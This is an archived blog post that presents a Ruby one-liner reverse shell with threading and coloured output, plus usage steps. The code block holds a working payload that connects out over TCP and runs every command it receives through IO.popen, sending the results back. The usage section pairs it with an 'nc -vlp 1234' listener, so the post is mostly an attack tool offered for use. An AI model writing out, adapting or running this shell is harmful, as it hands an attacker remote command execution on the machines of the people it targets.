---
layout: post
title: "RUBY ONE LINER COLORED THREADED REVERSE SHELL"
date: 2020-10-03T19:23:00+05:30
categories: ["Programming"]
description: "Develop a unique oneliner colored reverse shell in Ruby Language This is a simple one liner reverse shell with threading and color feature. Every command gets executed in a"
original_url: "https://blog.alphathreat.in/index.php?post/2020/10/03/RUBY-ONE-LINER-COLORED-THREADED-REVERSE-SHELL"
---

Develop a unique oneliner colored reverse shell in Ruby Language

This is a simple one liner reverse shell with threading and color feature.

Every command gets executed in a separate thread which prevents breaking of shell due to error. Also Handles any exception and sends it to attacker side.

The commands sent will be shown in color and bold for a better view.

<p class="img-missing" role="note"><strong>Screenshot unavailable</strong> — <code>.0_m.png</code> was not captured by the Internet Archive.</p>

**Description:**

1: Executing the reverse shell

2: Connection from Reverse shell to localhost. Notice the commands sent in color. Initiating another connection from shell (this will be executed in a separate thread thus we have two working reverse shells now)

3: Connection from second reverse shell.

4: First reverse shell still alive and working.

**CODE**

```

ruby -e 'require "socket";color=["\e[31m", "\e[32m", "\e[33m","e[34m","e[35m","e[36m"];s=TCPSocket.new("127.0.0.1", 1234);while cmd=s.gets();begin;Thread.new{IO.popen(cmd){|f| s.print("\e[0m" + f.read()+color[rand(6)]+"\e[1m")}};rescue => f;s.print(f);end;end;'
```

**USAGE**

Listen via nc -vlp 1234 on one terminal

On another just copy paste the above code. You will get reverse shell
